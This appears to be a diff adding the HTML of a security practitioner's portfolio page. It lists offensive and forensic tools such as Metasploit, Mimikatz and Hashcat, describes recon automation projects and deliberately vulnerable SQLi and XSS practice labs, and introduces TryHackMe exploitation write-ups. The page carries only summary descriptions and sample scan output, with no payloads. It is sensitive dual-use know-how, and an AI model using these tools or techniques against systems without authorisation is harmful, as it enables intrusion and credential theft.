+      <ul class="tgroup__grid"><li data-tool-item data-hay="autopsy digital forensics · gui platform dfir disk forensics file carving timeline deleted files gui digital forensics"><button class="tool" type="button" data-tool="autopsy" data-tip="Autopsy is an open-source digital forensics platform and the graphical interface to The Sleuth Kit." aria-describedby="tip-autopsy"><span class="tool__mono" aria-hidden="true">Au</span><span class="tool__name">Autopsy</span><span class="tool__cat">Digital Forensics</span></button><span class="sr-only" id="tip-autopsy">Autopsy is an open-source digital forensics platform and the graphical interface to The Sleuth Kit.</span></li><li data-tool-item data-hay="volatility 3 memory forensics · cli framework memory forensics dfir malware process injection credentials python digital forensics"><button class="tool" type="button" data-tool="volatility" data-tip="Volatility is the industry-standard open-source memory forensics framework." aria-describedby="tip-volatility"><span class="tool__mono" aria-hidden="true">V3</span><span class="tool__name">Volatility 3</span><span class="tool__cat">Memory Forensics</span></button><span class="sr-only" id="tip-volatility">Volatility is the industry-standard open-source memory forensics framework.</span></li><li data-tool-item data-hay="ftk imager evidence acquisition · imaging tool evidence acquisition e01 chain of custody dfir disk imaging memory dump digital forensics"><button class="tool" type="button" data-tool="ftk" data-tip="FTK Imager is the gold-standard free tool from AccessData for forensically sound evidence acquisition." aria-describedby="tip-ftk"><span class="tool__mono" aria-hidden="true">Fi</span><span class="tool__name">FTK Imager</span><span class="tool__cat">Evidence Acquisition</span></button><span class="sr-only" id="tip-ftk">FTK Imager is the gold-standard free tool from AccessData for forensically sound evidence acquisition.</span></li></ul>
+      
+    </div>
+    <div class="tgroup" data-reveal data-group="Network Security">
+      <div class="tgroup__head"><h3>Network Security</h3><span class="tgroup__n">5 tools</span></div>
+      <ul class="tgroup__grid"><li data-tool-item data-hay="wireshark network forensics · packet analyser network forensics pcap c2 detection tshark protocol analysis ioc network security"><button class="tool" type="button" data-tool="wireshark" data-tip="Wireshark is the world&#x27;s most widely-used network protocol analyser." aria-describedby="tip-wireshark"><span class="tool__mono" aria-hidden="true">Wi</span><span class="tool__name">Wireshark</span><span class="tool__cat">Network Forensics</span></button><span class="sr-only" id="tip-wireshark">Wireshark is the world&#x27;s most widely-used network protocol analyser.</span></li><li data-tool-item data-hay="nmap reconnaissance · port scanner reconnaissance port scanning nse vulnerability detection oscp pentesting network security"><button class="tool" type="button" data-tool="nmap" data-tip="Nmap (Network Mapper) is the de-facto standard open-source network scanner used by security professionals worldwide." aria-describedby="tip-nmap"><span class="tool__mono" aria-hidden="true">Nm</span><span class="tool__name">Nmap</span><span class="tool__cat">Reconnaissance</span></button><span class="sr-only" id="tip-nmap">Nmap (Network Mapper) is the de-facto standard open-source network scanner used by security professionals worldwide.</span></li><li data-tool-item data-hay="snort network defense · ids/ips ids/ips network defense blue team signature detection siem network security"><button class="tool" type="button" data-tool="snort" data-tip="Snort is the world&#x27;s most widely deployed open-source Intrusion Detection and Prevention System." aria-describedby="tip-snort"><span class="tool__mono" aria-hidden="true">Sn</span><span class="tool__name">Snort</span><span class="tool__cat">Network Defense</span></button><span class="sr-only" id="tip-snort">Snort is the world&#x27;s most widely deployed open-source Intrusion Detection and Prevention System.</span></li><li data-tool-item data-hay="splunk siem · log analysis · threat hunting siem soc spl log analysis threat hunting alert triage blue team network security"><button class="tool" type="button" data-tool="splunk" data-tip="Splunk is the leading Security Information and Event Management (SIEM) platform used in enterprise SOC environments." aria-describedby="tip-splunk"><span class="tool__mono" aria-hidden="true">Sp</span><span class="tool__name">Splunk</span><span class="tool__cat">SIEM</span></button><span class="sr-only" id="tip-splunk">Splunk is the leading Security Information and Event Management (SIEM) platform used in enterprise SOC environments.</span></li><li data-tool-item data-hay="aircrack-ng wireless security · 802.11 auditing wireless 802.11 wpa2 deauth monitor mode handshake airmon-ng network security"><button class="tool" type="button" data-tool="aircrack" data-tip="Aircrack-ng is the complete open-source suite for 802.11 wireless network security assessment." aria-describedby="tip-aircrack"><span class="tool__mono" aria-hidden="true">An</span><span class="tool__name">Aircrack-ng</span><span class="tool__cat">Wireless Security</span></button><span class="sr-only" id="tip-aircrack">Aircrack-ng is the complete open-source suite for 802.11 wireless network security assessment.</span></li></ul>
+      
+    </div>
+    <div class="tgroup" data-reveal data-group="Web Application Security">
+      <div class="tgroup__head"><h3>Web Application Security</h3><span class="tgroup__n">5 tools</span></div>
+      <ul class="tgroup__grid"><li data-tool-item data-hay="burp suite web application security · proxy web app testing proxy sqli xss idor ssrf fuzzing web application security"><button class="tool" type="button" data-tool="burp" data-tip="Burp Suite is the leading toolkit for web application security testing." aria-describedby="tip-burp"><span class="tool__mono" aria-hidden="true">Bs</span><span class="tool__name">Burp Suite</span><span class="tool__cat">Web Application Security</span></button><span class="sr-only" id="tip-burp">Burp Suite is the leading toolkit for web application security testing.</span></li><li data-tool-item data-hay="sqlmap web app security · sqli automation sql injection web security automation database owasp pentesting web application security"><button class="tool" type="button" data-tool="sqlmap" data-tip="SQLMap is the industry-standard open-source tool for detecting and exploiting SQL injection vulnerabilities." aria-describedby="tip-sqlmap"><span class="tool__mono" aria-hidden="true">Sq</span><span class="tool__name">SQLMap</span><span class="tool__cat">Web App Security</span></button><span class="sr-only" id="tip-sqlmap">SQLMap is the industry-standard open-source tool for detecting and exploiting SQL injection vulnerabilities.</span></li><li data-tool-item data-hay="owasp zap web app security · free scanner owasp web security free tool proxy automation ci/cd web application security"><button class="tool" type="button" data-tool="zap" data-tip="OWASP ZAP (Zed Attack Proxy) is the most widely used free, open-source web application security scanner, maintained by OWASP itself." aria-describedby="tip-zap"><span class="tool__mono" aria-hidden="true">Oz</span><span class="tool__name">OWASP ZAP</span><span class="tool__cat">Web App Security</span></button><span class="sr-only" id="tip-zap">OWASP ZAP (Zed Attack Proxy) is the most widely used free, open-source web application security scanner, maintained by OWASP itself.</span></li><li data-tool-item data-hay="nikto web app security · vulnerability scanner web security vulnerability scanner cve server auditing pentesting web application security"><button class="tool" type="button" data-tool="nikto" data-tip="Nikto is a fast, open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, outdated software versions, and…" aria-describedby="tip-nikto"><span class="tool__mono" aria-hidden="true">Ni</span><span class="tool__name">Nikto</span><span class="tool__cat">Web App Security</span></button><span class="sr-only" id="tip-nikto">Nikto is a fast, open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, outdated software versions, and…</span></li><li data-tool-item data-hay="gobuster directory busting · dns brute-force directory busting web recon dns enum go s3 ctf pentesting web application security"><button class="tool" type="button" data-tool="gobuster" data-tip="Gobuster is a fast, concurrent directory, file, DNS, and S3 bucket brute-forcing tool written in Go." aria-describedby="tip-gobuster"><span class="tool__mono" aria-hidden="true">Go</span><span class="tool__name">Gobuster</span><span class="tool__cat">Directory Busting</span></button><span class="sr-only" id="tip-gobuster">Gobuster is a fast, concurrent directory, file, DNS, and S3 bucket brute-forcing tool written in Go.</span></li></ul>
+      
+    </div>
+    <div class="tgroup" data-reveal data-group="Penetration Testing">
+      <div class="tgroup__head"><h3>Penetration Testing</h3><span class="tgroup__n">10 tools</span></div>
+      <ul class="tgroup__grid"><li data-tool-item data-hay="metasploit framework exploitation · post-exploitation exploitation meterpreter post-exploitation cve pivoting pentesting penetration testing"><button class="tool" type="button" data-tool="metasploit" data-tip="The Metasploit Framework is the world&#x27;s most used penetration testing platform." aria-describedby="tip-metasploit"><span class="tool__mono" aria-hidden="true">Mf</span><span class="tool__name">Metasploit Framework</span><span class="tool__cat">Exploitation</span></button><span class="sr-only" id="tip-metasploit">The Metasploit Framework is the world&#x27;s most used penetration testing platform.</span></li><li data-tool-item data-hay="kali linux security os · daily driver platform linux pentesting os forensics mode rolling release 600+ tools daily driver penetration testing"><button class="tool" type="button" data-tool="kali" data-tip="Kali Linux is the industry-standard Debian-based Linux distribution purpose-built for penetration testing, digital forensics, and red team operations." aria-describedby="tip-kali"><span class="tool__mono" aria-hidden="true">Kl</span><span class="tool__name">Kali Linux</span><span class="tool__cat">Security OS</span></button><span class="sr-only" id="tip-kali">Kali Linux is the industry-standard Debian-based Linux distribution purpose-built for penetration testing, digital forensics, and red team operations.</span></li><li data-tool-item data-hay="hashcat password cracking · gpu accelerated password cracking gpu ntlm kerberoasting wpa2 ctf penetration testing"><button class="tool" type="button" data-tool="hashcat" data-tip="Hashcat is the world&#x27;s fastest and most advanced password recovery tool, leveraging GPU acceleration to crack hashes orders of magnitude faster than…" aria-describedby="tip-hashcat"><span class="tool__mono" aria-hidden="true">Ha</span><span class="tool__name">Hashcat</span><span class="tool__cat">Password Cracking</span></button><span class="sr-only" id="tip-hashcat">Hashcat is the world&#x27;s fastest and most advanced password recovery tool, leveraging GPU acceleration to crack hashes orders of magnitude faster than…</span></li><li data-tool-item data-hay="john the ripper password cracking · cpu-based password cracking cpu linux ssh keys archives ctf penetration testing"><button class="tool" type="button" data-tool="johnripper" data-tip="John the Ripper is the original, battle-tested password cracking tool, optimised for CPU-based cracking." aria-describedby="tip-johnripper"><span class="tool__mono" aria-hidden="true">Jt</span><span class="tool__name">John the Ripper</span><span class="tool__cat">Password Cracking</span></button><span class="sr-only" id="tip-johnripper">John the Ripper is the original, battle-tested password cracking tool, optimised for CPU-based cracking.</span></li><li data-tool-item data-hay="hydra password cracking · online brute force brute force network services ssh web forms ctf pentesting penetration testing"><button class="tool" type="button" data-tool="hydra" data-tip="THC-Hydra is a fast, parallelised network login cracker supporting dozens of protocols." aria-describedby="tip-hydra"><span class="tool__mono" aria-hidden="true">Hy</span><span class="tool__name">Hydra</span><span class="tool__cat">Password Cracking</span></button><span class="sr-only" id="tip-hydra">THC-Hydra is a fast, parallelised network login cracker supporting dozens of protocols.</span></li><li data-tool-item data-hay="mimikatz post-exploitation · credential extraction active directory post-exploitation kerberos lsass windows red team penetration testing"><button class="tool" type="button" data-tool="mimikatz" data-tip="Mimikatz is the definitive Windows post-exploitation tool for extracting plaintext passwords, password hashes, PIN codes, and Kerberos tickets…" aria-describedby="tip-mimikatz"><span class="tool__mono" aria-hidden="true">Mi</span><span class="tool__name">Mimikatz</span><span class="tool__cat">Post-Exploitation</span></button><span class="sr-only" id="tip-mimikatz">Mimikatz is the definitive Windows post-exploitation tool for extracting plaintext passwords, password hashes, PIN codes, and Kerberos tickets…</span></li><li data-tool-item data-hay="bloodhound active directory · attack path mapping active directory attack paths sharphound privilege escalation red team penetration testing"><button class="tool" type="button" data-tool="bloodhound" data-tip="BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment." aria-describedby="tip-bloodhound"><span class="tool__mono" aria-hidden="true">Bl</span><span class="tool__name">BloodHound</span><span class="tool__cat">Active Directory</span></button><span class="sr-only" id="tip-bloodhound">BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment.</span></li><li data-tool-item data-hay="maltego osint · link analysis · graph intel osint link analysis graph intel domain recon threat actor transforms penetration testing"><button class="tool" type="button" data-tool="maltego" data-tip="Maltego is a powerful visual intelligence platform that maps relationships between people, organisations, domains, IPs, phone numbers, and social…" aria-describedby="tip-maltego"><span class="tool__mono" aria-hidden="true">Ma</span><span class="tool__name">Maltego</span><span class="tool__cat">OSINT</span></button><span class="sr-only" id="tip-maltego">Maltego is a powerful visual intelligence platform that maps relationships between people, organisations, domains, IPs, phone numbers, and social…</span></li><li data-tool-item data-hay="recon-ng osint · reconnaissance framework osint reconnaissance python modular framework reporting penetration testing"><button class="tool" type="button" data-tool="reconng" data-tip="Recon-ng is a full-featured reconnaissance framework written in Python, built with a Metasploit-like module structure." aria-describedby="tip-reconng"><span class="tool__mono" aria-hidden="true">Rn</span><span class="tool__name">Recon-ng</span><span class="tool__cat">OSINT</span></button><span class="sr-only" id="tip-reconng">Recon-ng is a full-featured reconnaissance framework written in Python, built with a Metasploit-like module structure.</span></li><li data-tool-item data-hay="osint framework open-source intelligence · recon osint reconnaissance shodan dns metadata google dorking theharvester penetration testing"><button class="tool" type="button" data-tool="osint" data-tip="The OSINT Framework is a structured methodology and toolset for gathering intelligence from publicly available sources — without ever touching the…" aria-describedby="tip-osint"><span class="tool__mono" aria-hidden="true">Of</span><span class="tool__name">OSINT Framework</span><span class="tool__cat">Open-Source Intelligence</span></button><span class="sr-only" id="tip-osint">The OSINT Framework is a structured methodology and toolset for gathering intelligence from publicly available sources — without ever touching the…</span></li></ul>
+      
+    </div>
+    <div class="tgroup" data-reveal data-group="Malware Analysis">
+      <div class="tgroup__head"><h3>Malware Analysis</h3><span class="tgroup__n">2 tools</span></div>
+      <ul class="tgroup__grid"><li data-tool-item data-hay="ghidra / ida pro reverse engineering · disassembler reverse engineering malware analysis decompiler pe analysis nsa ida pro malware analysis"><button class="tool" type="button" data-tool="ghidra" data-tip="Ghidra is the NSA&#x27;s open-source reverse engineering framework, and IDA Pro is the industry-standard commercial disassembler." aria-describedby="tip-ghidra"><span class="tool__mono" aria-hidden="true">Gi</span><span class="tool__name">Ghidra / IDA Pro</span><span class="tool__cat">Reverse Engineering</span></button><span class="sr-only" id="tip-ghidra">Ghidra is the NSA&#x27;s open-source reverse engineering framework, and IDA Pro is the industry-standard commercial disassembler.</span></li><li data-tool-item data-hay="yara malware analysis · pattern matching malware analysis pattern matching threat intel dfir detection engineering malware analysis"><button class="tool" type="button" data-tool="yara" data-tip="YARA is the industry-standard pattern-matching tool used to identify and classify malware samples based on textual or binary patterns." aria-describedby="tip-yara"><span class="tool__mono" aria-hidden="true">Ya</span><span class="tool__name">YARA</span><span class="tool__cat">Malware Analysis</span></button><span class="sr-only" id="tip-yara">YARA is the industry-standard pattern-matching tool used to identify and classify malware samples based on textual or binary patterns.</span></li></ul>
+      
+    </div>
+    <div class="tgroup" data-reveal data-group="Programming and Automation">
+      <div class="tgroup__head"><h3>Programming and Automation</h3><span class="tgroup__n">1 tool</span></div>
+      <ul class="tgroup__grid"><li data-tool-item data-hay="python scripting · automation · tool development python scripting impacket scapy pwntools automation forensics programming and automation"><button class="tool" type="button" data-tool="python" data-tip="Python is a versatile scripting language widely used for security tooling." aria-describedby="tip-python"><span class="tool__mono" aria-hidden="true">Py</span><span class="tool__name">Python</span><span class="tool__cat">Scripting</span></button><span class="sr-only" id="tip-python">Python is a versatile scripting language widely used for security tooling.</span></li></ul>
+      <p class="tgroup__note">Languages used across my projects: Bash, JavaScript, TypeScript and Python.</p>
+    </div>
+    </div>
+    <p class="empty" id="toolEmpty" hidden>No tools match that search. Try another keyword or clear the filters.</p>
+  </div>
+</section>
+
+<!-- ============ PROJECTS ============ -->
+<section class="sec sec--ink" id="projects" aria-labelledby="projTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>Projects</p>
+        <h2 class="sec__title" id="projTitle" data-split>Security tools and labs, built from scratch.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>Everything here was built and tested in lab environments. Open a project for the full breakdown, or go straight to the repository.</p>
+    </header>
+    <div class="pfilters">
+      <div class="fchips" role="group" aria-label="Filter projects by category"><button type="button" class="fchip is-on" data-pfilter="all" aria-pressed="true">All <i>8</i></button><button type="button" class="fchip" data-pfilter="recon" aria-pressed="false">Recon &amp; Automation <i>4</i></button><button type="button" class="fchip" data-pfilter="web" aria-pressed="false">Web Security Labs <i>3</i></button><button type="button" class="fchip" data-pfilter="kb" aria-pressed="false">Knowledge Base <i>1</i></button></div>
+      <p class="tcount tcount--dark" id="projCount" role="status" aria-live="polite">8 projects</p>
+    </div>
+    <div class="pgrid" id="projGrid">
+      <article class="pfeat" id="project-bbrecon" data-project="bbrecon" data-cat="recon" data-reveal>
+        <div class="pfeat__copy">
+          <p class="pfeat__flag"><span class="pcard__no">01</span> Featured project · main project</p>
+          <p class="pcard__cat">Bug Bounty / Pentesting · Bash</p>
+          <h3 class="pfeat__title">Bug Bounty Recon Engine</h3>
+          <p class="pfeat__desc">Automates the first mile of a bug bounty engagement — turns a domain into a structured attack-surface map in one self-contained, checkpointed Bash script that can be safely killed and resumed.</p>
+          <p class="pfeat__sub">What it covers</p>
+          <ul class="caps"><li>Subdomain enumeration</li><li>Live host discovery (HTTP probing)</li><li>URL collection</li><li>Parameter discovery</li><li>JavaScript endpoint extraction</li><li>API endpoint discovery</li><li>Candidate generation: takeover candidates, GF patterns and Nuclei findings</li></ul>
+          <p class="pfeat__note">Output is a structured map of leads for manual review. It does not prove that any vulnerability exists.</p>
+          <dl class="pcard__meta">
+            <div><dt>Proof</dt><dd>10-phase pipeline · resumable checkpoints · wraps subfinder, httpx, nmap, katana, ffuf, nuclei</dd></div>
+            <div><dt>Output</dt><dd>Full attack-surface map: subdomains, live hosts, ports, URLs, JS endpoints, params, Nuclei findings</dd></div>
+          </dl>
+          <ul class="stack" aria-label="Technology stack"><li>Bash</li><li>subfinder</li><li>httpx</li><li>nmap</li><li>katana</li><li>ffuf</li><li>nuclei</li></ul>
+          <div class="pfeat__foot"><span class="status" data-status="public" data-status-for="bbrecon"><i aria-hidden="true"></i><b>Public repository</b></span><div class="pcard__actions"><button class="more" type="button" data-project="bbrecon">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/BugBounty-Recon-Engine" target="_blank" rel="noopener">GitHub ↗</a></div></div>
+        </div>
+        <div class="pfeat__vis" aria-hidden="true">
+          <div class="pipe"><p class="pipe__label">Pipeline stages</p><ol class="pipe__list"><li style="--i:0"><span>Subdomain enum</span></li><li style="--i:1"><span>HTTP probing</span></li><li style="--i:2"><span>Port scan</span></li><li style="--i:3"><span>URL / JS collection</span></li><li style="--i:4"><span>Fuzzing</span></li><li style="--i:5"><span>Parameter discovery</span></li><li style="--i:6"><span>CI/CD exposure</span></li><li style="--i:7"><span>Nuclei sweep</span></li><li style="--i:8"><span>Takeover checks</span></li></ol></div>
+          <div class="termwin"><div class="termwin__bar"><i></i><i></i><i></i><span>recon_engine.sh — full scan</span></div><pre><span class="cmd">./recon_engine.sh example.com</span>
+<span class="hi">[01] DISCOVER   subdomains: 47 found</span>
+<span class="hi">[02] PROBE      live hosts: 31</span>
+<span class="hi">[03] ENUMERATE  ports scanned</span>
+<span class="out">[06] DETECT     ffuf + config exposure check</span>
+<span class="warn">[09] COMPLETE   Nuclei sweep — 3 medium, 1 high</span>
+<span class="hi">[✓]   Resumable checkpoint saved after every phase</span></pre></div>
+        </div>
+      </article>
+      <article class="pcard pcard--term" id="project-reconkit" data-project="reconkit" data-cat="recon" data-reveal style="--span:7">
+        <div class="pcard__top"><span class="pcard__no">02</span><span class="pcard__cat">Penetration Testing · Python v2.0</span><span class="status" data-status="public" data-status-for="reconkit"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <div class="termwin termwin--sm" aria-hidden="true"><div class="termwin__bar"><i></i><i></i><i></i><span>recon_v2/main.py — full scan</span></div><pre><span class="cmd">python3 main.py -t 10.10.x.x --ports 1-65535 --threads 300</span>
+<span class="hi">[DNS]   A: 10.10.x.x  MX: mail.target.com  NS: ns1.target.com</span>
+<span class="hi">[PORTS] Open: 22/ssh  80/http  443/https  445/smb</span>
+<span class="warn">[CVE]   Apache 2.4.18 → CVE-2017-7679 applicable</span>
+<span class="hi">[SUBS]  Found: dev.target.com  vpn.target.com</span>
+<span class="hi">[✓]    Report: recon_10_10_x_x_20260519.html</span></pre></div>
+        <h3 class="pcard__title">Automated Recon &amp; Enumeration Toolkit v2.0</h3>
+        <p class="pcard__desc">Modular recon framework for authorised testing and lab practice. DNS enumeration, multi-threaded port scanning, subdomain brute-force, web fingerprinting (25+ signatures), WHOIS/ASN, and banner grabbing with CVE hints.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>6 active modules · stealth mode · passive recon via crt.sh &amp; Wayback Machine</dd></div><div><dt>Output</dt><dd>Dark-theme HTML report auto-generated after every scan</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>Python 3.8+</li><li>DNS Enum</li><li>Port Scanner</li><li>Subdomain BF</li><li>HTML Report</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="reconkit">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/ReconForge" target="_blank" rel="noopener">GitHub ↗</a></div>
+      </article>
+      <article class="pcard pcard--num-ivory" id="project-sqlilab" data-project="sqlilab" data-cat="web" data-reveal style="--span:5">
+        <div class="pcard__top"><span class="pcard__no">03</span><span class="pcard__cat">Web App Security · TypeScript</span><span class="status" data-status="public" data-status-for="sqlilab"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <p class="bignum" aria-hidden="true"><b data-count="53">53</b><span>labs</span></p>
+        <h3 class="pcard__title">SQL Injection Practice Lab</h3>
+        <p class="pcard__desc">A full-stack SQL injection playground for repeatable local practice. React + TypeScript + Vite + Tailwind frontend, Node + Express + TypeScript backend, SQLite storage.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>53 labs · classic, blind, time-based &amp; second-order injection</dd></div><div><dt>Output</dt><dd>Full-stack React + Node app, resets cleanly per attempt</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>React</li><li>TypeScript</li><li>Vite</li><li>Node.js / Express</li><li>SQLite</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="sqlilab">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/SQL-INJECTION-LAB" target="_blank" rel="noopener">GitHub ↗</a></div>
+      </article>
+      <article class="pcard pcard--num-wine" id="project-faultline" data-project="faultline" data-cat="web" data-reveal style="--span:5">
+        <div class="pcard__top"><span class="pcard__no">04</span><span class="pcard__cat">Web App Security · Node.js</span><span class="status" data-status="public" data-status-for="faultline"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <p class="bignum" aria-hidden="true"><b data-count="36">36</b><span>labs</span></p>
+        <h3 class="pcard__title">Faultline — Local Web Hacking Lab</h3>
+        <p class="pcard__desc">36 hands-on web application vulnerability labs across three difficulty tiers. Runs entirely on localhost with a dark/light mode toggle for long practice sessions.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>36 labs across easy / medium / hard · zero cloud dependency</dd></div><div><dt>Output</dt><dd>Self-hosted lab, nothing leaves your machine</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>Node.js</li><li>Express</li><li>JavaScript</li><li>Local-only</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="faultline">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/Faultline-Web-Security-Labs" target="_blank" rel="noopener">GitHub ↗</a></div>
+      </article>
+      <article class="pcard pcard--search" id="project-reconql" data-project="reconql" data-cat="recon" data-reveal style="--span:7">
+        <div class="pcard__top"><span class="pcard__no">05</span><span class="pcard__cat">Bug Bounty · Recon · JavaScript</span><span class="status" data-status="public" data-status-for="reconql"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <div class="searchbar" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="6.5"/><path d="M16 16l4.5 4.5"/></svg><span>91 pre-built dork queries across 23 recon categories</span><i></i></div>
+        <h3 class="pcard__title">ReconQL — Dorking &amp; Recon Search Engine</h3>
+        <p class="pcard__desc">A Google-dorking recon search engine for bug bounty hunting, covering subdomain enumeration, API discovery, parameter discovery, exposed files, and login panels.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>91 pre-built dork queries across 23 recon categories</dd></div><div><dt>Output</dt><dd>Static site, live on GitHub Pages</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>JavaScript</li><li>Google Dorking</li><li>GitHub Pages</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="reconql">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/ReconQL-Passive-Recon-Console" target="_blank" rel="noopener">GitHub ↗</a><a class="link" href="https://bhaktabsharma.github.io/ReconQL-Passive-Recon-Console/" target="_blank" rel="noopener">Live demo ↗</a></div>
+      </article>
+      <article class="pcard pcard--dots" id="project-crawlspace" data-project="crawlspace" data-cat="recon" data-reveal style="--span:4">
+        <div class="pcard__top"><span class="pcard__no">06</span><span class="pcard__cat">Bug Bounty · Recon · HTML/JS</span><span class="status" data-status="public" data-status-for="crawlspace"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <div class="taxo" aria-hidden="true"><i style="--i:0"></i><i style="--i:1"></i><i style="--i:2"></i><i style="--i:3"></i><i style="--i:4"></i><i style="--i:5"></i><i style="--i:6"></i><i style="--i:7"></i><i style="--i:8"></i><i style="--i:9"></i><i style="--i:10"></i><i style="--i:11"></i><i style="--i:12"></i></div>
+        <h3 class="pcard__title">Crawlspace — Attack Surface Discovery</h3>
+        <p class="pcard__desc">An attack-surface discovery taxonomy and query generator, built as a recon checklist so nothing gets missed while scoping a target.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>72 categories across 13 attack-surface groups + query generator</dd></div><div><dt>Output</dt><dd>Ready-to-use dork query per category</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>HTML5</li><li>JavaScript</li><li>Static Site</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="crawlspace">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/Crawlspace-Attack-Surface" target="_blank" rel="noopener">GitHub ↗</a><a class="link" href="https://bhaktabsharma.github.io/Crawlspace-Attack-Surface/" target="_blank" rel="noopener">Live demo ↗</a></div>
+      </article>
+      <article class="pcard pcard--num-gold" id="project-casefile" data-project="casefile" data-cat="kb" data-reveal style="--span:4">
+        <div class="pcard__top"><span class="pcard__no">07</span><span class="pcard__cat">Security Knowledgebase · JavaScript</span><span class="status" data-status="public" data-status-for="casefile"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <p class="bignum" aria-hidden="true"><b data-count="979">979</b><span>topics</span></p>
+        <h3 class="pcard__title">CaseFile — Personal Security Wiki</h3>
+        <p class="pcard__desc">A personal security knowledgebase covering techniques, tools, and lessons learned across labs and CTF challenges — structured for fast recall mid-lab.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>979 topics across 16 categories · 56 write-ups and growing</dd></div><div><dt>Output</dt><dd>Searchable methodology reference</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>JavaScript</li><li>Knowledgebase</li><li>Static Site</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="casefile">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/CaseFile" target="_blank" rel="noopener">GitHub ↗</a><a class="link" href="https://bhaktabsharma.github.io/CaseFile/" target="_blank" rel="noopener">Live demo ↗</a></div>
+      </article>
+      <article class="pcard pcard--num-brown" id="project-xsslab" data-project="xsslab" data-cat="web" data-reveal style="--span:4">
+        <div class="pcard__top"><span class="pcard__no">08</span><span class="pcard__cat">Web App Security · React / Vue / Next.js</span><span class="status" data-status="public" data-status-for="xsslab"><i aria-hidden="true"></i><b>Public repository</b></span></div>
+        <p class="bignum" aria-hidden="true"><b data-count="72">72</b><span>labs</span></p>
+        <h3 class="pcard__title">XSS Bugs Lab</h3>
+        <p class="pcard__desc">Deliberately vulnerable React, Vue, and Next.js environments for XSS practice, so each framework&#x27;s own quirks get proper attention.</p>
+        <dl class="pcard__meta"><div><dt>Proof</dt><dd>72 labs · reflected, stored &amp; DOM-based XSS across 3 frameworks</dd></div><div><dt>Output</dt><dd>SQLite-backed progress tracking</dd></div></dl>
+        <ul class="stack" aria-label="Technology stack"><li>React</li><li>Vue</li><li>Next.js</li><li>SQLite</li></ul>
+        <div class="pcard__actions"><button class="more" type="button" data-project="xsslab">View details <span aria-hidden="true">→</span></button><a class="link" href="https://github.com/bhaktabsharma/XSS-Bugs-Lab" target="_blank" rel="noopener">GitHub ↗</a></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ WRITEUPS ============ -->
+<section class="sec sec--ivory" id="writeups" aria-labelledby="wuTitle">
+  <div class="wrap">
+    <header class="sec__head sec__head--split">
+      <div>
+        <p class="label" data-reveal>Research</p>
+        <h2 class="sec__title" id="wuTitle" data-split>CTF writeups and lab research.</h2>
+      </div>
+      <p class="sec__sub" data-reveal>Step-by-step walkthroughs of TryHackMe challenges, with the commands, reasoning and lessons behind each one.</p>
+    </header>
+    <ol class="wlist">
+      <li class="wrow" data-writeup="blue" data-reveal>
+        <div class="wrow__meta"><span class="diff diff--easy"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class=""></i><i class=""></i></span>Easy</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">Windows Exploitation</p><h3 class="wrow__title">Blue</h3><p class="wrow__desc">Full compromise of a Windows 7 machine via the infamous MS17-010 SMB vulnerability, exploited with Metasploit and followed by credential dumping.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>EternalBlue</li><li>MS17-010</li><li>Metasploit</li><li>Hashdump</li></ul><button class="more" type="button" data-writeup="blue">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+      <li class="wrow" data-writeup="invwin" data-reveal>
+        <div class="wrow__meta"><span class="diff diff--medium"><span class="diff__dots" aria-hidden="true"><i class="on"></i><i class="on"></i><i class=""></i></span>Medium</span><span class="wrow__platform">TryHackMe</span></div>
+        <div class="wrow__main"><p class="wrow__topic">Active Directory</p><h3 class="wrow__title">Internal Windows</h3><p class="wrow__desc">Post-compromise forensic investigation of a Windows machine — reconstructing the attacker&#x27;s timeline through event logs, registry hives, scheduled tasks, and persistence mechanisms.</p></div>
+        <div class="wrow__side"><ul class="wtags" aria-label="Topics"><li>AD Enum</li><li>Privilege Escalation</li><li>Pass-the-Hash</li></ul><button class="more" type="button" data-writeup="invwin">Read more <span aria-hidden="true">→</span></button></div>
+      </li>
+      <li class="wrow" data-writeup="memfor" data-reveal>
